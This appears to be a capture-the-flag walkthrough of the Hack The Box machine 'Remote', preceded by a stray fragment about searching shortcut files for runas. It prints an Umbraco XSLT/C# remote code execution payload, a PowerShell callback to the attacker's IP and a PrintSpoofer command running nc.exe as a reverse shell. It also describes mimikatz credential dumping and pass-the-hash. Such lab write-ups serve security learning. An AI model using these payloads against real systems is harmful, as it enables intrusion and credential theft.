enumerate stored lnk files by doing the below and checking them for runas as strings: Generate a list of all lnk files on the system:\nGet-ChildItem \u0026#34;C:\\\u0026#34; *.lnk -Recurse -Force -ErrorAction SilentlyContinue | Where-Object { $_.PSIsContainer -eq $false } | ForEach-Object { $_.FullName } | Out-File lnkFiles.txt Command Breakdown: Get-ChildItem \u0026quot;C:\\\u0026quot; *.lnk -Recurse -Force -ErrorAction SilentlyContinue\nGet-ChildItem: Retrieves a list of items (files and directories) from the specified location. \u0026quot;C:\\\u0026quot;: Specifies the root directory of the C:\\ drive to search. *.lnk: Filters the search to only include files with the .lnk extension (shortcut files). -Recurse: Instructs PowerShell to search through all subdirectories of C:\\, not just the top-level directory. -Force: Includes hidden and system files in the search. -ErrorAction SilentlyContinue: Suppresses error messages (like permission denied errors) from being displayed. | Where-Object { $_.PSIsContainer -eq $false }\n|: Passes the output of Get-ChildItem to the next command in the pipeline. Where-Object: Filters objects passed through the pipeline based on a condition. $_: Represents the current object in the pipeline. PSIsContainer -eq $false: Ensures that only files (not directories) are passed through the pipeline. The PSIsContainer property is true for directories and false for files. | ForEach-Object { $_.FullName }\n|: Continues passing the filtered files to the next command. ForEach-Object { $_.FullName }: Iterates over each file and extracts the FullName property, which is the complete path to the file. | Out-File lnkFiles.txt\n|: Pipes the full file paths to the final command. Out-File lnkFiles.txt: Writes the output (the list of full file paths) to the file lnkFiles.txt. Loop through the generated list try and read any text stored in the .lnk file:\nForEach($file in Get-Content .\\lnkFiles.txt) { Write-Output $file; Get-Content $file | Select-String runas -ErrorAction SilentlyContinue } Command Breakdown: ForEach($file in Get-Content .\\lnkFiles.txt)\nForEach($file in Get-Content .\\lnkFiles.txt): Loops through each line (representing file paths) in the lnkFiles.txt file. Get-Content .\\lnkFiles.txt: Reads the contents of lnkFiles.txt and treats each line (file path) as an item. $file: Represents the current file path from the loop. { Write-Output $file;\nWrite-Output $file: Outputs the current file path being processed (for visibility or logging purposes). ``This prints the file path from lnkFiles.txt to the console or wherever the output is being redirected. Get-Content $file |\nGet-Content $file: Reads the content of the file represented by $file. $file is the current file path from the lnkFiles.txt file. Select-String runas -ErrorAction SilentlyContinue }\n|: Pipes the content of the file into the next command. Select-String runas: Searches the file\u0026rsquo;s content for the string \u0026quot;runas\u0026quot;. If \u0026quot;runas\u0026quot; is found, the corresponding line will be output. -ErrorAction SilentlyContinue: Suppresses any errors (e.g., if the file doesn\u0026rsquo;t exist or there are issues reading it). We get a hit!!! Tells us it is a lnk file for the ZKAccess3.5 binary. We can see \u0026ldquo;runas.exe\u0026rdquo; is being used. We can see the parmaters for the lnk file when it was created are: \u0026ldquo;` ",

        "content": "Hack The Box Remote Walkthrough/Writeup: https://app.hackthebox.com/machines/Remote How I use variables \u0026amp; wordlists: Variables: In my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists: I have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP-Scans: Basic Scan: I do this simple scan just get a lay of the land:\nkali in 40-49_Career/46-Boxes/46.02-HTB/Remote/scans 2GiB/7GiB | 524MiB/1GiB with /usr/bin/zsh 🕙 09:02:23 zsh ❯ nmap $box -Pn -sT Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-08 09:02 BST Nmap scan report for 10.129.200.122 Host is up (0.039s latency). Not shown: 993 closed tcp ports (conn-refused) PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 111/tcp open rpcbind 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 2049/tcp open nfs Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds We can see there is some low hanging fruit FTP, SMB, NFS \u0026amp; HTTP we will enumerate these whilst we have a more intensive NMAP Scan run: In-Depth Scan: More in depth scan kali in 40-49_Career/46-Boxes/46.02-HTB/Remote/scans 2GiB/7GiB | 524MiB/1GiB with /usr/bin/zsh took 17s 🕙 09:06:54 zsh ❯ sudo nmap -p- -sV -sC -O --disable-arp-ping -Pn -oA FullTCP $box [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-08 09:07 BST Nmap scan report for 10.129.200.122 Host is up (0.037s latency). Not shown: 65519 closed tcp ports (reset) PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |_ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Home - Acme Widgets 111/tcp open rpcbind? |_rpcinfo: ERROR: Script execution failed (use -d to debug) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 2049/tcp open mountd 1-3 (RPC #100005) 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49664/tcp open msrpc Microsoft Windows RPC 49665/tcp open msrpc Microsoft Windows RPC 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49678/tcp open msrpc Microsoft Windows RPC 49679/tcp open msrpc Microsoft Windows RPC 49680/tcp open msrpc Microsoft Windows RPC No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.94SVN%E=4%D=9/8%OT=21%CT=1%CU=44443%PV=Y%DS=2%DC=I%G=Y%TM=66DD5 OS:BE2%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%T OS:S=U)SEQ(SP=106%GCD=2%ISR=10C%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M53CNW8NNS% OS:O2=M53CNW8NNS%O3=M53CNW8%O4=M53CNW8NNS%O5=M53CNW8NNS%O6=M53CNNS)WIN(W1=F OS:FFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M OS:53CNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=8 OS:0%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0% OS:Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z% OS:A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y% OS:DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIP OS:L=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z) Network Distance: 2 hops Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 59m59s | smb2-time: | date: 2024-09-08T09:09:49 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 143.44 seconds FTP 21 Enumeration: I connect but is shows there is no information in the share. Just to ensure I am not being crazy I try to download all files using wget. wget -m --no-passive ftp://anonymous:anonymous@$box However, there is nothing in the FTP share so we can move on. SMB 445 Enumeration: I check for null session \u0026amp; guest account but these are both disabled for SMB: netexec smb $box -u '' -p '' --shares\nnetexec smb $box -u 'guest' -p '' --shares\nDiscoveries:\nWe can see the hose is Running Windows 10 or Server 2019 \u0026amp; that SMB Signing is disabled (This would be great if we had more than one machine in the env as we could do a relay attack) There doesn\u0026rsquo;t seem to be much else here, so let\u0026rsquo;s move on.\nNFS 2049 Enumeration: As NFS by default is very insecure (unless using kerberos you can only limit the source IP connections) we can mount the share locally.\nCreate target folder to mount it to:\nmkdir target-NFS Mount the share:\nsudo mount -t nfs $box:/ ./target-NFS -o nolock\nWe find it has the site_backups folder:\nThis could mean it has hard coded creds in it or other interesting things. Log Files: Looking through the NFS share I find a Logs folder:\nGrepping through the files we see the following entry:\nPasword information:\nSo from this we can see that the site is running Umbraco \u0026amp; that the password is 10 chars long as a minimum: I then see these login attempts:\nWe can see the valid admin user is admin@htb.local \u0026amp; not admin Enumerating The Version Number: After some hunting I found this page that tells us how to enumerate the version of Umbraco.\nhttps://our.umbraco.com/forum/getting-started/installing-umbraco/15825-Umbraco-version-and-a-test-site I grep the Web.Config and find the version is 7.12.4\nI run a quick search on exploit-db and find the following authenticated exploit:\nhttps://www.exploit-db.com/exploits/49488 It is an authenticated exploit so we can safely assume that there will be some credentials somewhere, either in this share or on the site. I find the Admin Panel Login Page: http://10.129.200.122/umbraco/#/login The hunt for credentials: I find this file Umbraco.sdf in the App_Data directory: I had never heard of this file but after some searching found the following:\nWhat is an SDF file? An SDF file contains a compact relational database saved in the SQL Server Compact (SQL CE) format, which is developed by Microsoft. It is designed for applications that run on mobile devices and desktops and contains the complete database contents, which may be up to 4GB in size.\nExtracting Data from the .sdf file: Initially after-being unable to view the file locally I spun up a windows VM and tried to extract the data with this tool but it would not work for me (this was a rabbit hole that I spent alot of time on.): https://github.com/christianhelle/sqlcequery Good Old Strings: There be hashes in them thar .sdf files: Eventually I just resorted to running \u0026ldquo;Strings\u0026rdquo; on the file and hoping for the best \u0026amp; guess what, some lovely hashes were at the top! Cracking the hashes: I run the admin hash through hashcat \u0026amp; rockyou:\nIt\u0026rsquo;s SHA1 so cracked easily:\nHTTP Enumeration: Usually I would have done more here, but we have already gotten so far, that I did not have to do basic things like dir-busting just yet (we may come back here) 2. Foothold: I navigate to the Login Page \u0026amp; the creds work: http://10.129.200.122/umbraco/#/login With our creds we now have access to the admin console: There doesn\u0026rsquo;t seem to be much here in the way of information or a clear path to privesc. Getting RCE with public exploits: Exploit 1: I copy the public exploit here to my machine:\nhttps://www.exploit-db.com/exploits/49488 I run it \u0026amp; boom RCE:\nAfter some playing I was only ever able to get single commands to run, I could not use things like Invoke-WebRequest etc to get a shell. I also tried to upload a .bat POC with a simple call back to a running webserver I had, but I couldn\u0026rsquo;t even get that uploaded.\nAfter looking at the source code further for the above exploit, I could see the following line:\n# Based on: https://www.exploit-db.com/exploits/46153 so I had a look a that exploit: Exploit 2: The payload of this scrip has an XSLT (Extensible Stylesheet Language Transformations) script with an embedded C# script within it that executes calc.exe (the calculator).\nIf you\u0026rsquo;re unfamiliar launching calc.exe is a standard way to prove RCE on a machine. payload = \u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt;\u0026lt;xsl:stylesheet version=\u0026#34;1.0\u0026#34; \\ xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34; xmlns:msxsl=\u0026#34;urn:schemas-microsoft-com:xslt\u0026#34; \\ xmlns:csharp_user=\u0026#34;http://csharp.mycompany.com/mynamespace\u0026#34;\u0026gt;\\ \u0026lt;msxsl:script language=\u0026#34;C#\u0026#34; implements-prefix=\u0026#34;csharp_user\u0026#34;\u0026gt;public string xml() \\ { string cmd = \u0026#34;\u0026#34;; System.Diagnostics.Process proc = new System.Diagnostics.Process();\\ proc.StartInfo.FileName = \u0026#34;calc.exe\u0026#34;; proc.StartInfo.Arguments = cmd;\\ proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; \\ proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } \\ \u0026lt;/msxsl:script\u0026gt;\u0026lt;xsl:template match=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;xsl:value-of select=\u0026#34;csharp_user:xml()\u0026#34;/\u0026gt;\\ \u0026lt;/xsl:template\u0026gt; \u0026lt;/xsl:stylesheet\u0026gt; \u0026#39;; Let\u0026rsquo;s break this down so we both understand it better:\nKey Components of the Payload - Code Breakdown: XML Declaration:\n\u0026#39;\u0026lt;?xml version=\u0026#34;1.0\u0026#34;?\u0026gt;\u0026#39; Declares the XML version being used. XSLT Stylesheet Declaration:\n\u0026lt;xsl:stylesheet version=\u0026#34;1.0\u0026#34; xmlns:xsl=\u0026#34;http://www.w3.org/1999/XSL/Transform\u0026#34; xmlns:msxsl=\u0026#34;urn:schemas-microsoft-com:xslt\u0026#34; xmlns:csharp_user=\u0026#34;http://csharp.mycompany.com/mynamespace\u0026#34;\u0026gt; This starts the XSLT stylesheet with necessary namespaces for the transformation. xmlns:msxsl: Allows the usage of Microsoft\u0026rsquo;s XSLT extensions. xmlns:csharp_user: Custom namespace for the embedded C# script. Embedded C# Script:\n\u0026lt;msxsl:script language=\u0026#34;C#\u0026#34; implements-prefix=\u0026#34;csharp_user\u0026#34;\u0026gt; This embeds a C# script inside the XSLT. language=\u0026quot;C#\u0026quot;: Specifies that the script is written in C# implements-prefix=\u0026quot;csharp_user\u0026quot;: Links the script to the csharp_user namespace. C# Function to Execute Code:\npublic string xml() { string cmd = \u0026#34;\u0026#34;; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = \u0026#34;calc.exe\u0026#34;; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = true; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } This function named xml() is designed to execute the calc.exe program: Command Line Args: string cmd = \u0026quot;\u0026quot;; as we can see this allows us pass command line arguments to the program being called, it\u0026rsquo;s empty as we do not need to pass args to calc.exe, but we can use this for later. Process creation: Uses the System.Diagnostics.Process class to launch an external process (calc.exe). Define the process to launch: proc.StartInfo.FileName = \u0026quot;calc.exe\u0026quot; defines calc.exe as the process to launch. Shell behavior: UseShellExecute = false ensures that the process doesn\u0026rsquo;t require a shell to run. Redirect Output: RedirectStandardOutput = true captures the output (although calc.exe doesn\u0026rsquo;t produce output in this context). Return Output: return output; The function finally returns the process output. XSLT Template:\n\u0026lt;xsl:template match=\u0026#34;/\u0026#34;\u0026gt; \u0026lt;xsl:value-of select=\u0026#34;csharp_user:xml()\u0026#34;/\u0026gt; \u0026lt;/xsl:template\u0026gt; The XSLT template calls the xml() function from the csharp_user namespace. The template is applied to the root (/) of the XML document, which means it is executed as soon as the transformation is applied. Why does this work?\nClearly the program is not sanitizing input nor is it sandboxed which means we can execute arbitrary code. POC Test: So instead of running calc.exe we need it to trigger a reverse shell via powershell.\nLet\u0026rsquo;s run a POC to see if we can get this to work. public string xml() { string cmd = \u0026#34;wget http://10.10.14.34/POC\u0026#34;; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = \u0026#34;powershell.exe\u0026#34;; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true; proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; } This function named xml() is designed to execute the calc.exe program: Command Line Args: string cmd = \u0026quot;wget http://10.10.14.34/POC\u0026quot;; this is the IP of my host as well as a fake dir POC that I want it to try to connect to. Process creation: Uses the System.Diagnostics.Process class to launch an external process (calc.exe). Define the process to launch: proc.StartInfo.FileName = \u0026quot;powershell.exe\u0026quot; defines PowerShell as the process to launch. Shell behavior: UseShellExecute = false ensures that the process doesn\u0026rsquo;t require a shell to run. Redirect Output: RedirectStandardOutput = true captures the output (useful to redirect to us) Return Output: return output; The function finally returns the process output. Run the exploit \u0026amp; get a hit:\nThis proves it works as I get a connection. Base64 Encoded PowerShell String: So as we have a connection we want to create a payload that we can trigger back to ourselves:\nI navigate to https://www.revshells.com/ and use the PowerShell #3 (Base64) option and generate a reverse shell back to myself.\nI then place this in my script:\nStart my listener \u0026amp; trigger it \u0026amp; Success!!!!\n3. Privesc: Now we have a reverse-shell lets get to work\nImmediately looking at the User\u0026rsquo;s Privilege we have the \u0026ldquo;SeImpersonatePrivilege\u0026rdquo; which means potato exploits or printer exploits could be on the cards.\nSeImpersonatePrivilege Explained: Potato Exploits take advantage of these privileges.\nA security privilege in Windows that allows a process to adopt the security context of another user, typically after that user has been authenticated.\nEssential for scenarios where a service (like SQL Server or IIS) needs to perform operations on behalf of an authenticated user, particularly when accessing resources that require user-specific permissions.\nImpersonation with SeImpersonatePrivilege:\nProcess Tokens Overview: Every process has an associated token that represents the identity and privileges of the account that initiated the process. The token contains security information like user identity, group memberships, and associated privileges. This token is automatically assigned when the process starts, based on the account under which the process is running (e.g., a system account or a user account). Impersonation Using SeImpersonatePrivilege:\nWhen a service impersonates a user, it temporarily uses the user\u0026rsquo;s token to perform actions with the user\u0026rsquo;s permissions. The service can access resources (like file shares) that the user is allowed to access. The privilege allows the process running the service to \u0026ldquo;borrow\u0026rdquo; the identity of another user securely. Summarized: The token of each process defines what that process can do, based on the permissions of the account running it. SeImpersonatePrivilege allows services to use another user\u0026rsquo;s token for performing tasks on their behalf.\nUsage Context:\nIn the context of SQL Server or IIS using Windows Authentication, SeImpersonatePrivilege enables these services to perform tasks under the security context of the connected user, ensuring that operations adhere to the principle of least privilege and respect user-specific access controls. Example of Impersonate Privilege Working: How Impersonation Works:\nThe client connects to the service using their credentials (via Windows Auth). The service, upon needing to access other resources (like file shares), uses the client\u0026rsquo;s identity instead of its own. This is possible because the service account is given a special privilege called \u0026ldquo;Impersonate a client after authentication\u0026rdquo;. Simple Text-Based Diagram of Impersonation Mechanism Working:\n[Client] | | (1) Authenticates using Windows Auth v [Server (SQL/IIS)] | | (2) Needs to access other resources v [Impersonation Process] | | (3) Server adopts the client\u0026#39;s identity v [Other Resources] (e.g., File Shares) Client to Server Authentication: The client authenticates to the server using Windows authentication. Resource Request: The server requires access to additional resources (like files). Impersonation: The server impersonates the client\u0026rsquo;s identity to gain the same permissions the client has. Access Resources: The server, acting as the client, accesses external resources (file shares, etc.). 4. Ownership: I upload the PrintSpoofer exploit binary:\nSource: https://github.com/itm4n/PrintSpoofer I upload my nc.exe binary:\nI run the exploit:\n.\\printspoofer.exe -c \u0026quot;C:\\Users\\Public\\Desktop\\nc.exe 10.10.14.34 8888 -e cmd\u0026quot; Shell Caught!\n5. Persistence: Now that we have access we want ensure we can retain it:\nI transfer mimikatz to the box:\nI try and \u0026amp; dump LSASS \u0026amp; Kerberos tickets but it appears the LSASS process is protected which is standard on more updated systems:\nI dump the LSA (Local System Authorited secrets) secrets:\nI find a Default weak Password for accounts: I also dump the SAM secrets:\nI get the Administrator Hash and Kerberoros information for REMOTEAdministrator I verify the Administrator hash works using netexec:\nAs Win-Rm is running 5985,5986 I verify I can re-login using the Admin hash using a PTH (pass the hash attack)\nWe now have persistence.\nLessons Learned: What did I learn? I learned more about C# and creating a reverse shell via xml. I actually learned more about mimikatz (I just use the tool but I never actually sit and think about what is going on under the hood. I finally did and will expanding my notes \u0026amp; sharing them. What silly mistakes did I make? I spent 10 mins resetting the host as I was using the wrong username, this is why I usually always work from vars, but didn\u0026rsquo;t decided to manually type it in!!! Oh for some reason I used the wrong IP to connect back to myself on, triple check!!! Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n",
